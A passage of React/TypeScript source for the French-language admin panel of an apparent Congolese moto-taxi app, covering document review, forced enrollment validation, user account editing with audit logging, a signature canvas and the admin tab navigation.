      }));
    }, 4000);
  };

  // Live direct voice lines micro intercom simulation
  const handleToggleSOSIntercom = (userName: string) => {
    if (sosIntercomActive) {
      setSosIntercomActive(false);
      setSosIntercomLog([]);
    } else {
      setSosIntercomActive(true);
      setSosIntercomLog([
        `[CENTRAL] Connexion sécurisée au canal VoIP...`,
        `[CENTRAL] Appels d'Urgence GoMoto RDC actifs.`,
        `[COMMUNICATION] Ligne VoIP ouverte avec ${userName}`,
        `[COMMUNICATION] Son ambiant : Bruits de moteur, klaxons...`
      ]);
    }
  };

  // Helper functions for Owner and Driver compliance auditing
  const getAllOwnerFleetDocs = () => {
    const list: { owner: UserProfile; docs: any[] }[] = [];
    registeredUsers.forEach(u => {
      if (u.role === "owner") {
        const savedDocs = localStorage.getItem(`gomoto_owner_gov_docs_${u.id}`);
        if (savedDocs) {
          try {
            const parsed = JSON.parse(savedDocs);
            if (parsed && parsed.length > 0) {
              list.push({ owner: u, docs: parsed });
            }
          } catch(e) {}
        }
      }
    });

    // Seed empty default owner docs if none exists for simulation and rich UI
    if (list.length === 0) {
      const owners = registeredUsers.filter(u => u.role === "owner");
      owners.forEach(ow => {
        const seedValue = [
          {
            id: "gov-doc-1",
            type: "carte_rose",
            typeName: "Certificat d'Immatriculation (Carte Rose)",
            docNumber: "CAR-ROSE-2026-9902",
            issueDate: "2026-03-10",
            expiryDate: "2029-03-10",
            status: "pending",
            submittedAt: "12 juin 2026 à 10:15",
            photoUrl: "https://images.unsplash.com/photo-15544005313-94ddf0286df2?auto=format&fit=crop&q=80&w=150"
          },
          {
            id: "gov-doc-2",
            type: "assurance_moto",
            typeName: "Assurance Protection Civile (SONAS)",
            docNumber: "SON-ASSUR-88341-RDC",
            issueDate: "2026-01-01",
            expiryDate: "2027-01-01",
            status: "pending",
            submittedAt: "12 juin 2026 à 11:20",
            photoUrl: "https://images.unsplash.com/photo-15544005313-94ddf0286df2?auto=format&fit=crop&q=80&w=150"
          }
        ];
        localStorage.setItem(`gomoto_owner_gov_docs_${ow.id}`, JSON.stringify(seedValue));
        list.push({ owner: ow, docs: seedValue });
      });
    }
    return list;
  };

  const handleReviewOwnerFleetDoc = async (ownerId: string, docId: string, status: "approved" | "rejected") => {
    const key = `gomoto_owner_gov_docs_${ownerId}`;
    const saved = localStorage.getItem(key);
    if (saved) {
      try {
        const docs = JSON.parse(saved);
        const updated = docs.map((d: any) => d.id === docId ? { ...d, status } : d);
        localStorage.setItem(key, JSON.stringify(updated));
        
        await logAuditEvent({
          action: "REVIEW_FLEET_DOC",
          adminId,
          adminEmail,
          adminName,
          targetId: ownerId,
          targetName: `Propriétaire ID: ${ownerId}`,
          details: `Validation d'audit d'État pour la pièce justificative ${docId} du propriétaire ${ownerId}. Décision : ${status.toUpperCase()}.`,
        });

        alert(`Le document pour le propriétaire d'identifiant ${ownerId} a été marqué comme: ${status.toUpperCase()}`);
        // Force refresh state
        setDocAuditingSubTab(prev => prev);
      } catch (e) {}
    }
  };

  const getActiveDoubleEnrollings = () => {
    const list: { owner: UserProfile; driverName: string; code: string; status: string }[] = [];
    registeredUsers.forEach(u => {
      if (u.role === "owner") {
        const code = localStorage.getItem(`gomoto_owner_enrollment_code_${u.id}`) || `GOMOTO-RDC-${u.lastName.substring(0, 3).toUpperCase()}-99A33B`;
        const crossStatus = localStorage.getItem(`gomoto_cross_verification_${u.id}`) || "pending";
        list.push({
          owner: u,
          driverName: u.designatedDriverName || "Rachel Nyembo",
          code,
          status: crossStatus
        });
      }
    });
    return list;
  };

  const handleForceValidateEnrollment = async (ownerId: string, driverName: string) => {
    const keyOwner = `gomoto_cross_verification_${ownerId}`;
    localStorage.setItem(keyOwner, "confirmed");
    // Also save matching code to enable instant success
    localStorage.setItem(`gomoto_owner_enrollment_code_${ownerId}`, `GOMOTO-RDC-MBO-1A2B3C`);
    
    // Attempt driver profile coordination
    const savedUsers = localStorage.getItem("gomoto_users");
    if (savedUsers) {
      try {
        const users = JSON.parse(savedUsers);
        const dMatch = users.find((u: any) => u.role === "driver" && `${u.firstName} ${u.lastName}`.toLowerCase().includes(driverName.toLowerCase()));
        if (dMatch) {
          localStorage.setItem(`gomoto_cross_verification_${dMatch.id}`, "confirmed");
        }
      } catch (e) {}
    }

    await logAuditEvent({
      action: "FORCE_VALIDATE_ENROLLMENT",
      adminId,
      adminEmail,
      adminName,
      targetId: ownerId,
      targetName: driverName,
      details: `Validation administrative forcée d'enrôlement croisé d'État pour le motard ${driverName} et propriétaire ${ownerId}.`,
    });

    alert(`Liaison d'enrôlement croisé d'État validée de force par l'administration pour le dossier d'actifs de ${ownerId}.`);
    // refresh tab
    setDocAuditingSubTab(prev => prev);
  };

  // Filtering and search states
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedProvinceFilter, setSelectedProvinceFilter] = useState("Tous");
  const [selectedRoleFilter, setSelectedRoleFilter] = useState("Tous");

  // Administrateur / Co-Délégué User Editor States
  const [editingUser, setEditingUser] = useState<UserProfile | null>(null);
  const [showAddUserModal, setShowAddUserModal] = useState(false);

  // Co-Délégué & Staff policies, contract and signature states
  const [contractStaffName, setContractStaffName] = useState("");
  const [contractStaffID, setContractStaffID] = useState("");
  const [contractProvince, setContractProvince] = useState("Kinshasa");
  const [contractRole, setContractRole] = useState("Agent de Service Clientèle & Conseil");
  const [contractDate, setContractDate] = useState(new Date().toISOString().substring(0, 10));
  const [contractSigned, setContractSigned] = useState(false);
  const [policyDocView, setPolicyDocView] = useState<"limits" | "legal_central">("limits");
  const [isDrawingSignature, setIsDrawingSignature] = useState(false);
  const canvasRef = React.useRef<HTMLCanvasElement | null>(null);

  const startDrawing = (e: React.MouseEvent<HTMLCanvasElement> | React.TouchEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    
    setIsDrawingSignature(true);
    ctx.beginPath();
    const rect = canvas.getBoundingClientRect();
    const clientX = ('touches' in e) ? e.touches[0].clientX : e.clientX;
    const clientY = ('touches' in e) ? e.touches[0].clientY : e.clientY;
    const x = clientX - rect.left;
    const y = clientY - rect.top;
    ctx.moveTo(x, y);
    ctx.lineWidth = 2.5;
    ctx.strokeStyle = "#1e1b4b"; // Deep indigo
    ctx.lineCap = "round";
  };
  
  const drawSignature = (e: React.MouseEvent<HTMLCanvasElement> | React.TouchEvent<HTMLCanvasElement>) => {
    if (!isDrawingSignature) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    
    const rect = canvas.getBoundingClientRect();
    const clientX = ('touches' in e) ? e.touches[0].clientX : e.clientX;
    const clientY = ('touches' in e) ? e.touches[0].clientY : e.clientY;
    const x = clientX - rect.left;
    const y = clientY - rect.top;
    ctx.lineTo(x, y);
    ctx.stroke();
    e.preventDefault();
  };
  
  const stopDrawing = () => {
    setIsDrawingSignature(false);
  };
  
  const clearSignature = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    setContractSigned(false);
  };

  // States for adding user
  const [addFirstName, setAddFirstName] = useState("");
  const [addLastName, setAddLastName] = useState("");
  const [addPhone, setAddPhone] = useState("+243 ");
  const [addEmail, setAddEmail] = useState("");
  const [addRole, setAddRole] = useState<UserProfile["role"]>("driver");
  const [addProvince, setAddProvince] = useState("Kinshasa");
  const [addCity, setAddCity] = useState("Kinshasa");
  const [addCommune, setAddCommune] = useState("");
  const [addWalletCDF, setAddWalletCDF] = useState(0);
  const [addWalletUSD, setAddWalletUSD] = useState(0);
  const [addBankName, setAddBankName] = useState("");
  const [addBankAccountNumber, setAddBankAccountNumber] = useState("");
  const [addBankAccountName, setAddBankAccountName] = useState("");
  const [addMobileMoneyNumber, setAddMobileMoneyNumber] = useState("");
  const [addVehicleModel, setAddVehicleModel] = useState("");
  const [addVehiclePlate, setAddVehiclePlate] = useState("");

  // States for editing user
  const [editFirstName, setEditFirstName] = useState("");
  const [editLastName, setEditLastName] = useState("");
  const [editPhone, setEditPhone] = useState("");
  const [editEmail, setEditEmail] = useState("");
  const [editRole, setEditRole] = useState<UserProfile["role"]>("driver");
  const [editProvince, setEditProvince] = useState("Kinshasa");
  const [editCity, setEditCity] = useState("");
  const [editCommune, setEditCommune] = useState("");
  const [editQuartier, setEditQuartier] = useState("");
  const [editAvenue, setEditAvenue] = useState("");
  const [editNumber, setEditNumber] = useState("");
  const [editWalletCDF, setEditWalletCDF] = useState(0);
  const [editWalletUSD, setEditWalletUSD] = useState(0);
  const [editBankName, setEditBankName] = useState("");
  const [editBankAccountNumber, setEditBankAccountNumber] = useState("");
  const [editBankAccountName, setEditBankAccountName] = useState("");
  const [editMobileMoneyNumber, setEditMobileMoneyNumber] = useState("");
  const [editVehicleModel, setEditVehicleModel] = useState("");
  const [editVehiclePlate, setEditVehiclePlate] = useState("");

  const handleOpenEditModal = (user: UserProfile) => {
    setEditingUser(user);
    setEditFirstName(user.firstName || "");
    setEditLastName(user.lastName || "");
    setEditPhone(user.phone || "");
    setEditEmail(user.email || "");
    setEditRole(user.role || "driver");
    setEditProvince(user.address?.province || "Kinshasa");
    setEditCity(user.address?.city || "");
    setEditCommune(user.address?.commune || "");
    setEditQuartier(user.address?.quartier || "");
    setEditAvenue(user.address?.avenue || "");
    setEditNumber(user.address?.number || "");
    setEditWalletCDF(user.walletBalanceCDF || 0);
    setEditWalletUSD(user.walletBalanceUSD || 0);
    setEditBankName(user.bankName || "");
    setEditBankAccountNumber(user.bankAccountNumber || "");
    setEditBankAccountName(user.bankAccountName || "");
    setEditMobileMoneyNumber(user.mobileMoneyNumber || "");
    setEditVehicleModel(user.vehicleModel || "");
    setEditVehiclePlate(user.vehiclePlate || "");
  };

  const handleSaveEditUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingUser || !onUpdateUsersList) return;

    const updatedUserObj = {
      ...editingUser,
      firstName: editFirstName.trim(),
      lastName: editLastName.trim(),
      phone: editPhone.trim(),
      email: editEmail.trim(),
      role: editRole,
      address: {
        ...editingUser.address,
        province: editProvince,
        city: editCity.trim(),
        commune: editCommune.trim(),
        quartier: editQuartier.trim(),
        avenue: editAvenue.trim(),
        number: editNumber.trim(),
      },
      walletBalanceCDF: Number(editWalletCDF),
      walletBalanceUSD: Number(editWalletUSD),
      bankName: editBankName.trim(),
      bankAccountNumber: editBankAccountNumber.trim(),
      bankAccountName: editBankAccountName.trim(),
      mobileMoneyNumber: editMobileMoneyNumber.trim(),
      vehicleModel: editVehicleModel.trim(),
      vehiclePlate: editVehiclePlate.trim(),
    };

    const updatedUsers = registeredUsers.map((u) => {
      if (u.id === editingUser.id) {
        return updatedUserObj;
      }
      return u;
    });

    onUpdateUsersList(updatedUsers);
    setEditingUser(null);

    await logAuditEvent({
      action: "SAVE_EDIT_USER",
      adminId,
      adminEmail,
      adminName,
      targetId: editingUser.id,
      targetName: `${editFirstName} ${editLastName}`,
      details: `Données de compte de ${editFirstName} ${editLastName} modifiées par l'auditeur. Solde : ${editWalletCDF} CDF / $${editWalletUSD} USD. Rôle: ${editRole}.`,
      payloadBefore: editingUser,
      payloadAfter: updatedUserObj
    });

    alert(`Compte de ${editFirstName} ${editLastName} mis à jour avec succès dans le registre.`);
  };

  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!addFirstName.trim() || !addLastName.trim() || !addPhone.trim() || !onUpdateUsersList) return;

    const newUserId = `usr-gen-${Math.random().toString(36).substring(2, 9)}`;
    const newUser: UserProfile = {
      id: newUserId,
      firstName: addFirstName.trim(),
      lastName: addLastName.trim(),
      phone: addPhone.trim(),
      email: addEmail.trim() || `${addFirstName.toLowerCase().replace(/\s+/g, '')}@gomoto-generated.cd`,
      role: addRole,
      isRegistered: true,
      registrationDate: new Date().toLocaleDateString("fr-FR"),
      address: {
        province: addProvince,
        city: addCity.trim() || "Kinshasa",
        commune: addCommune.trim() || "Gombe",
        quartier: "Gombe",
        localite: "Kinshasa",
        avenue: "Boulevard du 30 Juin",
        number: "10"
      },
      walletBalanceCDF: Number(addWalletCDF),
      walletBalanceUSD: Number(addWalletUSD),
      bankName: addBankName.trim(),
      bankAccountNumber: addBankAccountNumber.trim(),
      bankAccountName: addBankAccountName.trim(),
      mobileMoneyNumber: addMobileMoneyNumber.trim() || addPhone.trim(),
      vehicleModel: addVehicleModel.trim(),
      vehiclePlate: addVehiclePlate.trim(),
      isOnline: false,
      rating: 5.0,
      ridesCompleted: 0,
      documentStatus: "approved"
    };

    onUpdateUsersList([...registeredUsers, newUser]);
    setShowAddUserModal(false);

    // Reset Form
    setAddFirstName("");
    setAddLastName("");
    setAddPhone("+243 ");
    setAddEmail("");
    setAddRole("driver");
    setAddCommune("");
    setAddWalletCDF(0);
    setAddWalletUSD(0);
    setAddBankName("");
    setAddBankAccountNumber("");
    setAddBankAccountName("");
    setAddMobileMoneyNumber("");
    setAddVehicleModel("");
    setAddVehiclePlate("");

    await logAuditEvent({
      action: "CREATE_USER",
      adminId,
      adminEmail,
      adminName,
      targetId: newUserId,
      targetName: `${newUser.firstName} ${newUser.lastName}`,
      details: `Création administrative d'un nouveau compte citoyen. Nom : ${newUser.firstName} ${newUser.lastName}, Rôle : ${newUser.role.toUpperCase()}, Téléphone : ${newUser.phone}.`,
      payloadAfter: newUser
    });

    alert(`Nouveau citoyen ${newUser.firstName} ${newUser.lastName} enregistré avec succès comme ${addRole.toUpperCase()} !`);
  };

  const handleDeleteUser = async (userId: string, fullName: string) => {
    if (!onUpdateUsersList) return;
    const confirmDelete = window.confirm(`⚠️ ATTENTION ACTION IRRÉVERSIBLE !\n\nÊtes-vous sûr de vouloir supprimer définitivement le compte de ${fullName} de l'application et radier l'intégralité de ses données fiscales et bancaires ?`);
    
    if (confirmDelete) {
      const beforeState = registeredUsers.find(u => u.id === userId);
      const updated = registeredUsers.filter((u) => u.id !== userId);
      onUpdateUsersList(updated);
      
      await logAuditEvent({
        action: "DELETE_USER",
        adminId,
        adminEmail,
        adminName,
        targetId: userId,
        targetName: fullName,
        details: `Radiation définitive et suppression irréversible du compte de ${fullName} (ID: ${userId}) de l'application.`,
        payloadBefore: beforeState
      });

      alert(`Compte de ${fullName} a été supprimé du registre de transport.`);
    }
  };

  const pendingRequests = modRequests.filter(req => req.status === "pending");
  const reviewedRequests = modRequests.filter(req => req.status !== "pending");

  const filteredUsers = registeredUsers.filter((u) => {
    const matchesSearch = 
      `${u.firstName} ${u.lastName}`.toLowerCase().includes(searchQuery.toLowerCase()) ||
      u.phone.includes(searchQuery) ||
      u.email.toLowerCase().includes(searchQuery.toLowerCase());
      
    const matchesProvince = 
      selectedProvinceFilter === "Tous" || u.address.province === selectedProvinceFilter;
      
    const matchesRole = 
      selectedRoleFilter === "Tous" || u.role === selectedRoleFilter;

    return matchesSearch && matchesProvince && matchesRole;
  });

  const handleNotesChange = (requestId: string, val: string) => {
    setAdminNotes(prev => ({ ...prev, [requestId]: val }));
  };

  return (
    <div id="admin-panel-container" className="bg-white border border-slate-200 rounded-3xl p-6 md:p-8 max-w-7xl mx-auto space-y-6 text-slate-800 shadow-sm">
      
      {/* Admin header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-200 pb-5">
        <div className="flex items-center gap-3">
          <div className="bg-red-50 text-red-650 p-2.5 rounded-2xl border border-red-100">
            <ShieldAlert className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-slate-900 flex items-center gap-1.5 flex-wrap">
              <span>{t("GoMoto CONGO • Cabinet d'Arbitrage et d'Audit")}</span>
              <span className="bg-red-100 text-red-800 text-[8.5px] font-bold uppercase font-mono px-2 py-0.5 rounded border border-red-200">
                {t("Direction Général")}
              </span>
            </h2>
            <p className="text-[10px] text-slate-500 font-medium">{t("Validation d'identité de conduite et recours d'état civil en RDC (26 provinces)")}</p>
          </div>
        </div>

        <button
          type="button"
          onClick={onBackToApp}
          className="bg-slate-100 hover:bg-slate-200 text-slate-750 py-2 px-5 rounded-xl text-xs font-bold transition-all cursor-pointer hover:scale-[1.02] active:scale-[0.98]"
        >
          {t("Retourner au Portail Utilisateur")}
        </button>
      </div>

      {/* Admin metrics overview panel */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200">
          <span className="text-[8px] font-bold text-slate-500 uppercase tracking-widest block">{t("Recours civils en attente")}</span>
          <span className="text-2xl font-mono font-bold text-blue-600 block mt-1">{pendingRequests.length} {t("Dossiers")}</span>
          <span className="text-[9px] text-slate-500 block font-medium">{t("Modifications de noms civils ou pièces d'État")}</span>
        </div>
        <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200">
          <span className="text-[8px] font-bold text-slate-500 uppercase tracking-widest block">{t("Partenaires Enrôlés Certifiés")}</span>
          <span className="text-2xl font-mono font-bold text-emerald-600 block mt-1">{registeredUsers.length} {t("Comptes")}</span>
          <span className="text-[9px] text-slate-500 block font-medium">{t("Motos, Conducteurs et Propriétaires validés")}</span>
        </div>
        <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200">
          <span className="text-[8px] font-bold text-slate-500 uppercase tracking-widest block">{t("Provinces sous surveillance")}</span>
          <span className="text-2xl font-mono font-bold text-indigo-600 block mt-1">26 {t("Provinces")}</span>
          <span className="text-[9px] text-slate-500 block font-medium">Kinshasa, Kivu, Katanga, Equateur, Kasai...</span>
        </div>
      </div>

      {/* Primary tabs controller */}
      <div className="flex gap-2 border-b border-slate-200 pb-2 overflow-x-auto scroller-hidden">
        <button
          type="button"
          onClick={() => setActiveSubTab("requests")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "requests" ? "bg-red-50 text-red-650 border border-red-100" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          {t("Dossiers de Recours")} ({pendingRequests.length})
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("documents")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "documents" ? "bg-red-50 text-red-650 border border-red-100" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          {t("Contrôle des Documents")} ({registeredUsers.filter(u => u.documentStatus === "pending" || !u.documentStatus).length})
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("users")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "users" ? "bg-red-50 text-red-650 border border-red-100" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          {t("Registre Universel")} ({filteredUsers.length})
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("transactions")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "transactions" ? "bg-red-50 text-red-650 border border-red-100" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          {t("Retraits Mobile")} ({withdrawals.filter(w => w.status === "pending").length})
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("analytics")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "analytics" ? "bg-indigo-600 text-white border border-indigo-500 font-bold shadow-sm shadow-indigo-100" : "text-indigo-650 hover:text-indigo-800 bg-indigo-50/50 border border-indigo-100/40"
          }`}
        >
          📊 {t("Volume Provinces")} (26)
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("emergencies")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer relative shrink-0 ${
            activeSubTab === "emergencies" 
              ? "bg-red-600 text-white border border-red-500 shadow-md shadow-red-200" 
              : "bg-red-50 text-red-650 hover:bg-red-100/50 border border-red-100"
          }`}
        >
          🚨 {t("SOS")} ({sosAlerts.filter((a: any) => a.status === "active").length})
          {sosAlerts.some((a: any) => a.status === "active") && (
            <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5 font-sans">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
            </span>
          )}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("partenariats")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "partenariats" ? "bg-yellow-50 text-yellow-900 border border-yellow-255 font-bold" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          📨 {t("Partenariats & Contrats Pro")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("delegation")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "delegation" ? "bg-indigo-50 text-indigo-900 border border-indigo-200 font-bold font-sans" : "text-slate-500 hover:text-slate-800"
          }`}
        >
          🔐 {t("Co-Délégation Admin")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("roles")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 flex items-center gap-1.5 ${
            activeSubTab === "roles" ? "bg-purple-600 text-white font-bold border-purple-500 shadow-sm" : "text-slate-550 hover:text-slate-800 bg-slate-50"
          }`}
        >
          <Key className="w-4 h-4" /> {t("Rôles & Permissions")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("cgu_staff")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "cgu_staff" ? "bg-indigo-600 text-white border border-indigo-505 font-bold" : "text-slate-550 hover:text-slate-800 bg-slate-50"
          }`}
        >
          📚 {t("Manuel & Chartes Staff")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("security_waf")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 ${
            activeSubTab === "security_waf" ? "bg-red-650 text-white border border-red-500 font-bold" : "text-slate-550 hover:text-slate-800 bg-slate-50"
          }`}
        >
          🛡️ {t("Sécurité & WAF Sandbox")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("audits")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 flex items-center gap-1.5 ${
            activeSubTab === "audits" ? "bg-emerald-605 text-white border border-emerald-500 font-bold" : "text-slate-550 hover:text-slate-800 bg-slate-50"
          }`}
        >
          <Shield className="w-4 h-4 text-emerald-500" /> 📜 {t("Registre d'Audit (Inaltérable)")}
        </button>
        <button
          type="button"
          onClick={() => setActiveSubTab("promotions")}
          className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shrink-0 flex items-center gap-1.5 ${
            activeSubTab === "promotions" ? "bg-amber-600 text-white font-bold border-amber-500 shadow-sm" : "text-slate-550 hover:text-slate-800 bg-slate-50 border border-slate-250/20"
          }`}
        >
          🏷️ {t("Promotions & Offres")}
        </button>
      </div>

      {/* ================= ADMIN TAB 1: MODIFICATION RECOURS MANAGEMENT ================= */}
      {activeSubTab === "requests" && (
        <div className="space-y-6">
          <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 text-xs text-slate-600 flex items-start gap-2.5">
            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
            <div>
              <span className="font-bold text-slate-850 block">Note d'arbitrage de la Direction :</span>
              <p className="mt-0.5 leading-normal text-[11px] font-medium">
                En approuvant un recours d'état civil, le certificat d'immatriculation d'État est immédiatement ré-édité avec écrasement sécurisé de l'ancien dossier. Soyez extrêmement vigilant sur les motifs de modification.
              </p>
            </div>
          </div>

          <div className="space-y-4">
            <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest flex items-center gap-1.5">
              <Clock className="w-4.5 h-4.5 text-blue-600" />
              <span>Dossiers de Recours Actifs</span>
            </h3>

            {pendingRequests.length > 0 ? (
              pendingRequests.map((req) => (
                <div key={req.id} className="bg-slate-50 rounded-3xl p-5 border border-slate-200 grid grid-cols-1 lg:grid-cols-12 gap-5">
                  {/* Requester overview */}
                  <div className="lg:col-span-4 space-y-2">
                    <div className="flex items-center gap-2.5">
                      <div className="h-8 w-8 rounded-full bg-white border border-slate-200 flex items-center justify-center text-slate-600 shadow-sm">
                        {req.userRole === "driver" ? <Bike className="w-4 h-4" /> : req.userRole === "owner" ? <Building className="w-4 h-4" /> : <User className="w-4 h-4" />}
                      </div>
                      <div>
                        <span className="text-[10px] font-bold uppercase text-slate-650 bg-white px-2 py-0.5 rounded border border-slate-200 block w-max shadow-sm">
                          {req.userRole === "driver" ? "Chauffeur" : req.userRole === "owner" ? "Propriétaire" : "Passager"}
                        </span>
                        <span className="text-[9px] text-slate-500 font-mono block mt-0.5">UID: {req.userId}</span>
                      </div>
                    </div>

                    <div className="border-t border-slate-200 pt-2 space-y-1.5 text-xs">
                      <div>
                        <span className="text-[8px] text-slate-500 font-bold uppercase block">Nom civil Actuel :</span>
                        <span className="font-bold text-slate-705">{req.currentFirstName} {req.currentLastName}</span>
                      </div>
                      <div>
                        <span className="text-[8px] text-slate-550 font-bold uppercase block">Nom civil Requit :</span>
                        <span className="font-extrabold text-blue-700">{req.requestedFirstName} {req.requestedLastName}</span>
                      </div>
                    </div>
                  </div>

                  {/* Justification details */}
                  <div className="lg:col-span-5 space-y-2.5 border-t lg:border-t-0 lg:border-x border-slate-200 px-0 lg:px-5">
                    <div>
                      <span className="text-[8px] text-slate-555 font-bold uppercase block">Motif légitime du Recours :</span>
                      <p className="text-[11px] text-slate-650 italic leading-relaxed mt-0.5">"{req.reason}"</p>
                    </div>

                    {/* Preview of submitted documents in Admin Modification Request card */}
                    {req.requestedDocNumber && (
                      <div className="p-3 bg-yellow-50/50 rounded-2xl border border-yellow-100 space-y-1.5 text-[11px] text-slate-800">
                        <span className="text-[8px] text-yellow-700 font-extrabold uppercase tracking-wider block">🔑 Pièce d'identité re-soumise en recours :</span>
                        <div className="grid grid-cols-2 gap-1 font-medium text-[10px]">
                          <div>
                            <span className="text-slate-500 font-bold block text-[8px] uppercase">Type :</span>
                            <span className="text-slate-900">
                              {req.requestedDocType === "carte_identite_nationale" ? "Carte d'Identité" :
                               req.requestedDocType === "passeport" ? "Passeport" :
                               req.requestedDocType === "permis_de_conduire" ? "Permis de conduire" : "Document étranger"}
                            </span>
                          </div>
                          <div>
                            <span className="text-slate-500 font-bold block text-[8px] uppercase">Numéro :</span>
                            <span className="font-mono text-slate-900 font-bold">{req.requestedDocNumber}</span>
                          </div>
                        </div>

                        {/* Images preview */}
                        {(req.requestedDocPhotoFront || req.requestedDocPhotoBack || req.requestedProfilePicture) && (
                          <div className="grid grid-cols-3 gap-1.5 pt-1.5 border-t border-yellow-200/50">
                            {req.requestedProfilePicture && (
                              <div className="text-center">
                                <span className="text-[7.5px] text-slate-500 block uppercase font-bold mb-0.5">Photo Profil</span>
                                <img src={req.requestedProfilePicture} className="h-10 mx-auto object-cover w-10 rounded-full border border-slate-200 bg-white" referrerPolicy="no-referrer" />
                              </div>
                            )}
                            {req.requestedDocPhotoFront && (
                              <div className="text-center col-span-1">
                                <span className="text-[7.5px] text-slate-500 block uppercase font-bold mb-0.5">Recto</span>
                                <img src={req.requestedDocPhotoFront} className="h-10 mx-auto object-contain rounded border border-slate-200 bg-white" referrerPolicy="no-referrer" />
                              </div>
                            )}
                            {req.requestedDocPhotoBack && (
                              <div className="text-center col-span-1">
                                <span className="text-[7.5px] text-slate-500 block uppercase font-bold mb-0.5">Verso</span>
                                <img src={req.requestedDocPhotoBack} className="h-10 mx-auto object-contain rounded border border-slate-200 bg-white" referrerPolicy="no-referrer" />
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    )}

                    <div className="bg-white p-2.5 rounded-xl border border-slate-250">
                      <label className="block text-[8px] font-bold text-slate-500 uppercase mb-1">Notes administratives justificatives obligatoires <span className="text-red-500">*</span></label>
                      <input
                        type="text"
                        placeholder="Rédiger votre note d'autorisation..."
                        value={adminNotes[req.id] || ""}
                        onChange={(e) => handleNotesChange(req.id, e.target.value)}
                        className="w-full bg-white border border-slate-200 text-slate-800 rounded-lg px-2.5 py-1.5 text-[10.5px] outline-none focus:border-blue-600"
                      />
                    </div>
                  </div>

                  {/* Direct validation actions */}
                  <div className="lg:col-span-3 flex flex-row lg:flex-col justify-end gap-2 items-end">
                    <span className="text-[9px] text-slate-500 font-mono text-right block self-start mb-auto lg:order-none order-last">
                      Transmis le : {req.submittedAt}
                    </span>

                    <button
                      type="button"
                      onClick={() => onReviewRequest(req.id, "rejected", adminNotes[req.id])}
                      className="w-full bg-red-50 hover:bg-red-100 text-red-650 border border-red-100 font-bold py-2 px-3 rounded-lg text-[10px] cursor-pointer flex items-center justify-center gap-1 transition-all"
                    >
                      <X className="w-3.5 h-3.5" />
                      <span>Rejeter et Radier</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        if (!adminNotes[req.id]) {
                          alert("Veuillez rédiger une note décisionnelle administrative avant d'approuver ou rejeter le recours.");
                          return;
                        }
                        onReviewRequest(req.id, "approved", adminNotes[req.id]);
                      }}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded-lg text-[10px] cursor-pointer flex items-center justify-center gap-1 transition-all shadow-sm"
                    >
                      <Check className="w-3.5 h-3.5" />
                      <span>Approuver & Ré-éditer Dossier</span>
                    </button>
                  </div>
                </div>
              ))
            ) : (
